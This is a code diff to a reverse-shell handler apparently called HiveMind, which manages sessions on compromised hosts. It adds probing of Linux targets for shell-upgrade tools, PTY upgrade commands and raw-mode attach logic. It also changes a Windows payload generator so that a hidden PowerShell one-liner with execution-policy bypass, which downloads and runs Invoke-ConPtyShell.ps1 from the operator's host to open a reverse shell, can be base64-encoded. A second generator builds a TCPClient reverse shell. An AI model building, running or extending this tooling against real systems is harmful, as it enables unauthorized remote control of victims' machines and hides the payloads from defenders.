@@ -73,9 +73,13 @@ class Session:
         # basic = original line-by-line mode.
         # raw   = byte-forwarding mode used after raw/upgrade.
         self.attach_mode = "basic"
-        # True after the Linux PTY upgrade command has been sent for this session.
+        # True after a real Linux PTY upgrade command has been sent for this session.
         # This prevents upgrade/session from sending the PTY command repeatedly.
         self.pty_upgraded = False
+        # none        = no upgrade state saved.
+        # pty         = python/script created a real PTY-like shell.
+        # interactive = fallback shell like /bin/sh -i, useful with raw mode but not a real PTY.
+        self.upgrade_mode = "none"
 
 # sessions: mapping session_id (int) -> Session object
 sessions = {}
@@ -228,10 +232,15 @@ def generate_payload(payload_type, lhost, encode=False):
         except Exception as e:
             safe_print(colored(f"[-] Failed to obtain terminal size: {e}. Using default values.", "red"), flush=True)
             rows, cols = "24", "80"
-        payload = (
-            f"powershell -nop -W hidden -noni -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
-            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT} -Rows {rows} -Cols {cols}\""
+        script_body = (
+            f"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
+            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT} -Rows {rows} -Cols {cols}"
         )
+        if encode:
+            encoded_payload = base64.b64encode(script_body.encode('utf-16le')).decode()
+            return f"powershell -nop -W hidden -noni -ep bypass -e {encoded_payload}"
+        else:
+            payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
     elif payload_type == "windows/reverse_tcp/powershell":
         script_body = (
             f"$TCPClient = New-Object Net.Sockets.TCPClient('{resolved_host}', {DEFAULT_PORT});"
@@ -444,9 +453,15 @@ def interactive_shell(session_id):
         session = sessions[session_id]
         attach_mode = getattr(session, "attach_mode", "basic")
         pty_upgraded = getattr(session, "pty_upgraded", False)
+        upgrade_mode = getattr(session, "upgrade_mode", "pty" if pty_upgraded else "none")
 
     if attach_mode == "raw":
-        mode_label = "raw + Linux PTY" if pty_upgraded else "raw"
+        if upgrade_mode == "pty" or pty_upgraded:
+            mode_label = "raw + Linux PTY"
+        elif upgrade_mode == "interactive":
+            mode_label = "raw + interactive shell"
+        else:
+            mode_label = "raw"
         safe_print(colored(f"[*] Session {session_id} is saved as {mode_label}. Using raw attach.", "yellow"), flush=True)
         raw_attach_session(session_id, auto_pty=False, remember=False)
         return
@@ -518,20 +533,132 @@ def drain_session_output(session, timeout=0.35, print_output=True):
     return got_data
 
 
+
+def capture_session_output(session, timeout=1.0, stop_marker=None):
+    """Capture data waiting on a session socket without printing it."""
+    end_time = time.time() + timeout
+    buffer = b""
+    stop_bytes = stop_marker.encode() if stop_marker else None
+
+    while time.time() < end_time:
+        try:
+            r, _, _ = select.select([session.conn], [], [], 0.05)
+        except Exception:
+            break
+        if not r:
+            continue
+        try:
+            data = session.conn.recv(4096)
+        except BlockingIOError:
+            continue
+        except Exception:
+            break
+        if not data:
+            break
+        buffer += data
+        session.last_heartbeat = time.time()
+        if stop_bytes and stop_bytes in buffer:
+            break
+
+    return buffer.decode(errors="ignore")
+
+
+def extract_marker_body(output, start_marker, end_marker):
+    """Return text between the last matching start/end markers.
+
+    Reverse shells often echo the command we send, so markers may appear in the
+    echoed command before the real command output. Using the last marker pair
+    avoids parsing the echoed command line as probe output.
+    """
+    end_index = output.rfind(end_marker)
+    if end_index == -1:
+        return ""
+    start_index = output.rfind(start_marker, 0, end_index)
+    if start_index == -1:
+        return ""
+    start_index += len(start_marker)
+    return output[start_index:end_index]
+
+
+def probe_linux_upgrade_tools(session):
+    """Probe the target for common Linux shell-upgrade tools."""
+    marker_id = f"{os.getpid()}_{int(time.time() * 1000)}"
+    start_marker = f"__HM_UPGRADE_START_{marker_id}__"
+    end_marker = f"__HM_UPGRADE_END_{marker_id}__"
+    probe_cmd = (
+        f"printf '{start_marker}\\n'; "
+        "printf 'PYTHON3=%s\\n' \"$(command -v python3 2>/dev/null)\"; "
+        "printf 'PYTHON=%s\\n' \"$(command -v python 2>/dev/null)\"; "
+        "printf 'SCRIPT=%s\\n' \"$(command -v script 2>/dev/null)\"; "
+        "printf 'BASH=%s\\n' \"$(command -v bash 2>/dev/null)\"; "
+        "printf 'SH=%s\\n' \"$(command -v sh 2>/dev/null)\"; "
+        f"printf '{end_marker}\\n'\n"
+    )
+
+    try:
+        session.conn.send(probe_cmd.encode())
+    except Exception as e:
+        safe_print(colored(f"[-] Failed to probe upgrade tools: {e}", "red"), flush=True)
+        return {}
+
+    output = capture_session_output(session, timeout=1.2, stop_marker=end_marker)
+    body = extract_marker_body(output, start_marker, end_marker)
+    tools = {}
+
+    for line in body.splitlines():
+        line = line.strip()
+        if "=" not in line:
+            continue
+        key, value = line.split("=", 1)
+        tools[key.strip()] = value.strip()
+
+    return tools
+
+
+def choose_linux_upgrade_command(tools):
+    """Choose the best available Linux upgrade command from probe results.
+
+    Returns (command, description, upgrade_mode).
+    upgrade_mode is:
+      pty         -> python/script should create a real PTY-like shell.
+      interactive -> /bin/sh -i or /bin/bash -i fallback; useful with raw mode, but `tty` may still say not a tty.
+    """
+    python_path = tools.get("PYTHON3") or tools.get("PYTHON")
+    script_path = tools.get("SCRIPT")
+    shell_path = tools.get("BASH") or tools.get("SH") or "/bin/sh"
+
+    if python_path:
+        command = f"export TERM=xterm; {python_path} -c 'import pty; pty.spawn(\"{shell_path}\")'\n"
+        description = f"Python PTY using {python_path} with {shell_path}"
+        return command, description, "pty"
+
+    if script_path:
+        command = f"export TERM=xterm; {script_path} -qc {shell_path} /dev/null\n"
+        description = f"script PTY using {script_path} with {shell_path}"
+        return command, description, "pty"
+
+    command = f"export TERM=xterm; {shell_path} -i\n"
+    description = f"fallback interactive shell using {shell_path}"
+    return command, description, "interactive"
+
 def try_linux_pty_upgrade(session):
     """
-    Try to spawn a PTY on a Linux/Unix target before raw attach mode.
-    This is useful for msfvenom linux/*/shell_reverse_tcp and simple /bin/sh reverse shells.
+    Probe a Linux/Unix target for available upgrade tools, choose the best one,
+    then attach in raw mode. This avoids blindly sending every fallback command.
+
+    Returns the selected upgrade mode:
+      pty         -> real PTY-like method, such as python pty.spawn or script.
+      interactive -> fallback shell, such as /bin/sh -i, saved with raw mode because that workflow is useful.
+      none        -> failed to send the upgrade command.
     """
     rows, cols = get_terminal_rows_cols()
-    pty_cmd = (
-        "export TERM=xterm; "
-        "(python3 -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")' "
-        "|| python -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")' "
-        "|| script -qc /bin/bash /dev/null "
-        "|| /bin/sh -i)\n"
-    )
+    tools = probe_linux_upgrade_tools(session)
+    pty_cmd, upgrade_description, upgrade_mode = choose_linux_upgrade_command(tools)
     resize_cmd = f"stty rows {rows} cols {cols}; export TERM=xterm\n"
+
+    safe_print(colored(f"[*] Upgrade method selected: {upgrade_description}", "yellow"), flush=True)
+    if upgrade_mode == "interactive":
+        safe_print(colored("[*] This fallback may still show `not a tty`, but it will be saved with raw mode because it is usable after the local raw step.", "yellow"), flush=True)
 
     try:
         session.conn.send(pty_cmd.encode())
@@ -540,8 +667,10 @@ def try_linux_pty_upgrade(session):
         session.conn.send(resize_cmd.encode())
         time.sleep(0.15)
         drain_session_output(session, timeout=0.20, print_output=False)
+        return upgrade_mode
     except Exception as e:
         safe_print(colored(f"[-] PTY upgrade command failed to send: {e}", "red"), flush=True)
+        return "none"
 
 
 def raw_attach_session(session_id, auto_pty=False, remember=True):
@@ -556,15 +685,22 @@ def raw_attach_session(session_id, auto_pty=False, remember=True):
             return
         session = sessions[session_id]
         already_pty_upgraded = getattr(session, "pty_upgraded", False)
+        existing_upgrade_mode = getattr(session, "upgrade_mode", "pty" if already_pty_upgraded else "none")
+
+    selected_upgrade_mode = existing_upgrade_mode
 
     if auto_pty:
-        if already_pty_upgraded:
-            safe_print(colored(f"[*] Session {session_id} is already marked as Linux PTY-upgraded. Skipping PTY command.", "yellow"), flush=True)
+        if existing_upgrade_mode in ("pty", "interactive"):
+            saved_label = "Linux PTY" if existing_upgrade_mode == "pty" else "interactive shell"
+            safe_print(colored(f"[*] Session {session_id} is already marked as upgraded with {saved_label}. Skipping upgrade command.", "yellow"), flush=True)
         else:
-            try_linux_pty_upgrade(session)
+            selected_upgrade_mode = try_linux_pty_upgrade(session)
+            if selected_upgrade_mode == "none":
+                return
             with lock:
                 if session_id in sessions:
-                    sessions[session_id].pty_upgraded = True
+                    sessions[session_id].upgrade_mode = selected_upgrade_mode
+                    sessions[session_id].pty_upgraded = selected_upgrade_mode == "pty"
 
     try:
         import tty, termios
@@ -583,15 +719,30 @@ def raw_attach_session(session_id, auto_pty=False, remember=True):
             if session_id in sessions:
                 sessions[session_id].attach_mode = "raw"
                 if auto_pty:
-                    sessions[session_id].pty_upgraded = True
-        saved_label = "raw + Linux PTY" if auto_pty or already_pty_upgraded else "raw"
+                    sessions[session_id].upgrade_mode = selected_upgrade_mode
+                    sessions[session_id].pty_upgraded = selected_upgrade_mode == "pty"
+        if auto_pty and selected_upgrade_mode == "pty":
+            saved_label = "raw + Linux PTY"
+        elif auto_pty and selected_upgrade_mode == "interactive":
+            saved_label = "raw + interactive shell"
+        elif existing_upgrade_mode == "pty" or already_pty_upgraded:
+            saved_label = "raw + Linux PTY"
+        elif existing_upgrade_mode == "interactive":
+            saved_label = "raw + interactive shell"
+        else:
+            saved_label = "raw"
         safe_print(colored(f"[*] Session {session_id} saved as {saved_label}. Future `session {session_id}` will reuse it.", "green"), flush=True)
+
+    use_local_raw = not (selected_upgrade_mode == "interactive" or existing_upgrade_mode == "interactive")
 
     safe_print(colored(f"\n[*] Raw attach to session {session_id}. Press Ctrl+] to return to HiveMind menu.", "yellow"), flush=True)
     safe_print(colored("[*] If the screen looks blank, press Enter once or type a command like: id", "yellow"), flush=True)
+    if not use_local_raw:
+        safe_print(colored("[*] Interactive fallback detected. Skipping local tty.setraw() so typing stays visible.", "yellow"), flush=True)
 
     try:
-        tty.setraw(sys.stdin.fileno())
+        if use_local_raw:
+            tty.setraw(sys.stdin.fileno())
 
         # Raw mode can look like it "kicked you out" because the last prompt may
         # have been printed before the local terminal switched to raw mode. Send one
@@ -609,12 +760,14 @@ def raw_attach_session(session_id, auto_pty=False, remember=True):
                 try:
                     data = session.conn.recv(4096)
                 except Exception as e:
-                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    if use_local_raw:
+                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                     safe_print(colored(f"\n[-] Error receiving data: {e}", "red"), flush=True)
                     remove_session(session_id)
                     return
                 if not data:
-                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    if use_local_raw:
+                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                     safe_print(colored("\n[-] Connection closed by remote host.", "red"), flush=True)
                     remove_session(session_id)
                     return
@@ -630,7 +783,8 @@ def raw_attach_session(session_id, auto_pty=False, remember=True):
                 try:
                     session.conn.send(data)
                 except Exception as e:
-                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    if use_local_raw:
+                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                     safe_print(colored(f"\n[-] Error sending data: {e}", "red"), flush=True)
                     return
     except KeyboardInterrupt:
@@ -639,10 +793,11 @@ def raw_attach_session(session_id, auto_pty=False, remember=True):
     except Exception as e:
         safe_print(colored(f"\n[-] Raw attach failed: {e}", "red"), flush=True)
     finally:
-        try:
-            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
-        except Exception:
-            pass
+        if use_local_raw:
+            try:
+                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+            except Exception:
+                pass
         safe_print(colored(f"\n[*] Returned from session {session_id}.", "yellow"), flush=True)
 
 
@@ -667,7 +822,13 @@ def list_sessions():
                             break
                     attach_mode = getattr(session, "attach_mode", "basic")
                     pty_upgraded = getattr(session, "pty_upgraded", False)
-                    mode_label = "raw+pty" if attach_mode == "raw" and pty_upgraded else attach_mode
+                    upgrade_mode = getattr(session, "upgrade_mode", "pty" if pty_upgraded else "none")
+                    if attach_mode == "raw" and (upgrade_mode == "pty" or pty_upgraded):
+                        mode_label = "raw+pty"
+                    elif attach_mode == "raw" and upgrade_mode == "interactive":
+                        mode_label = "raw+interactive"
+                    else:
+                        mode_label = attach_mode
                     safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]} [mode: {mode_label}]", "green"), flush=True)
                 except Exception:
                     safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
